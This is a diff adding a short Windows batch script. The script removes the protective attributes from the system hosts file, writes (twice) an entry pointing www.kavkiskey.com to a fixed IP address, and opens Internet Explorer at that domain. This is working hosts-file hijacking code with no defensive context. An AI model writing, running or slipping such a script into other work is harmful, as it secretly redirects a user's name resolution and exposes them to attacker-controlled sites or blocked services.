@@ -1,0 +1,5 @@
+﻿@echo off
+attrib C:\WINDOWS\system32\drivers\etc\hosts -r -s -a -h
+echo 60.190.218.24    www.kavkiskey.com>>C:\WINDOWS\system32\drivers\etc\hosts
+echo 60.190.218.24    www.kavkiskey.com>>C:\WINDOWS\system32\drivers\etc\hosts
+start "C:\Program Files\Internet Explorer\iexplore.exe"  http://www.kavkiskey.com 
